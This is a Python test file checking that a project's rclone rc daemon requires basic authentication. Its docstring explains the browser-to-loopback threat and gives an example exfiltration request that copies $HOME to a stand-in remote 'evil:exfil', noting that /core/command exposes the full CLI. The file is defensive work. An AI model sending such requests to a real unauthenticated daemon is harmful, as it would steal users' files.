"""rcd rc-API authentication.

The rclone rc daemon used to be spawned with --rc-no-auth, which left an
unauthenticated filesystem API on a loopback port. Loopback is not a boundary
against the browser: any page the user has open can POST to
http://127.0.0.1:<port>/..., and because rclone merges URL query parameters
into the rc call's arguments, a CORS-simple request (POST, text/plain, no
custom header — so no preflight) drives it blind even though the reply is
unreadable. /sync/copy?srcFs=$HOME&dstFs=evil:exfil is a working exfiltration
primitive; /core/command exposes the whole rclone CLI. Same threat the
tile-daemon token (D122) exists to close.

So each daemon now mints a random secret and requires basic auth. These tests
pin the properties that make that hold:
  * the spawn never passes --rc-no-auth, and hands the secret over in the
    ENVIRONMENT (not argv, where `ps` would show it to other local users);
  * every rc call carries the Authorization header;
  * the secret survives to another process via rcd.json and the registry;
  * a daemon recorded WITHOUT a secret (spawned by an older build, still alive
    across an upgrade) is still callable — no header, no breakage.
"""
import base64
import json
import os

import pytest

import fused_render.shell.mounts as mounts_mod


@pytest.fixture()
def home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("FUSED_RENDER_HOME", str(home))
    return home


@pytest.fixture(autouse=True)
def _clear_auth_cache():
    mounts_mod._forget_rcd_auth()
    yield
    mounts_mod._forget_rcd_auth()


class _FakePopen:
    """Captures the argv and env of the would-be rcd spawn."""

    calls: list = []

    def __init__(self, argv, **kw):
        type(self).calls.append((argv, kw))


@pytest.fixture
def spawn(monkeypatch):
    _FakePopen.calls = []
    monkeypatch.setattr(mounts_mod, "rclone_bin", lambda: "/usr/bin/rclone")
    monkeypatch.setattr(mounts_mod, "_live_rcd_port", lambda: None)  # force a spawn
    monkeypatch.setattr(mounts_mod.subprocess, "Popen", _FakePopen)
    seen = []

    def fake_rc(port, method, params=None, timeout=30, auth=None):
        seen.append({"port": port, "method": method, "auth": auth})
        return {"pid": 999}

    monkeypatch.setattr(mounts_mod, "_rc", fake_rc)
    return _FakePopen.calls, seen


# ---- spawn ------------------------------------------------------------------


def test_spawn_does_not_disable_auth(home, spawn):
    calls, _ = spawn
    mounts_mod.ensure_rcd()
    [(argv, _kw)] = calls
    assert "--rc-no-auth" not in argv


def test_secret_goes_in_the_env_not_argv(home, spawn):
    """`ps` must not reveal it to other local users."""
    calls, _ = spawn
    mounts_mod.ensure_rcd()
    [(argv, kw)] = calls
    env = kw["env"]
    secret = env["RCLONE_RC_PASS"]
    assert env["RCLONE_RC_USER"] == mounts_mod._RCD_RC_USER
    assert len(secret) >= 32  # token_urlsafe(32), not something guessable
    assert not any(secret in a for a in argv)
    assert env["PATH"] == os.environ["PATH"]  # inherits the rest of the env


def test_each_daemon_gets_a_fresh_secret(home, spawn):
    calls, _ = spawn
    mounts_mod.ensure_rcd()
    mounts_mod.ensure_rcd()
    a, b = [kw["env"]["RCLONE_RC_PASS"] for _argv, kw in calls]
    assert a != b


def test_spawn_probe_authenticates_before_state_is_written(home, spawn):
    """core/pid runs before rcd.json exists, so the spawn passes creds
    explicitly rather than relying on the lookup."""
    calls, seen = spawn
    mounts_mod.ensure_rcd()
    [(_argv, kw)] = calls
    probe = next(c for c in seen if c["method"] == "core/pid")
    assert probe["auth"] == (kw["env"]["RCLONE_RC_USER"],
                             kw["env"]["RCLONE_RC_PASS"])


def test_secret_is_recorded_for_other_processes(home, spawn):
    """rcd is shared per-home and outlives the server, so a later process
    reusing it must be able to authenticate."""
    calls, _ = spawn
    mounts_mod.ensure_rcd()
    [(_argv, kw)] = calls
    secret = kw["env"]["RCLONE_RC_PASS"]
    state = json.load(open(mounts_mod._rcd_state_path()))
    assert state["rc_pass"] == secret
    # ...and in the central registry, which is how the reaper reaches a daemon
    # whose own home dir (and rcd.json) is already gone.
    reg = json.load(open(mounts_mod._rcd_registry_path()))
    assert any(e.get("rc_pass") == secret for e in reg)
    assert mounts_mod._rcd_auth(state["port"]) == (state["rc_user"], secret)


# ---- the client side --------------------------------------------------------


def _serve_once(handler_state):
    """A one-shot loopback HTTP server that records the request it gets."""
    import http.server
    import threading

    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            handler_state["auth"] = self.headers.get("Authorization")
            handler_state["path"] = self.path
            body = b'{"pid": 4242}'
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.handle_request, daemon=True).start()
    return srv


def test_rc_sends_basic_auth_from_recorded_state(home):
    state = {}
    srv = _serve_once(state)
    port = srv.server_address[1]
    mounts_mod.write_rcd_state(port, 4242, auth=("fused-render", "s3cr3t"))

    assert mounts_mod._rc(port, "core/pid") == {"pid": 4242}
    expect = base64.b64encode(b"fused-render:s3cr3t").decode()
    assert state["auth"] == f"Basic {expect}"


def test_rc_omits_auth_for_a_daemon_recorded_without_one(home):
    """Back-compat: a pre-auth daemon still running across an upgrade keeps
    working until it is replaced."""
    state = {}
    srv = _serve_once(state)
    port = srv.server_address[1]
    mounts_mod.write_rcd_state(port, 4242)  # no auth recorded

    assert mounts_mod._rc(port, "core/pid") == {"pid": 4242}
    assert state["auth"] is None


def test_a_new_daemon_on_a_recycled_port_is_not_called_with_the_old_secret(home):
    mounts_mod.write_rcd_state(5555, 1, auth=("fused-render", "old"))
    assert mounts_mod._rcd_auth(5555) == ("fused-render", "old")
    mounts_mod.write_rcd_state(5555, 2, auth=("fused-render", "new"))
    assert mounts_mod._rcd_auth(5555) == ("fused-render", "new")
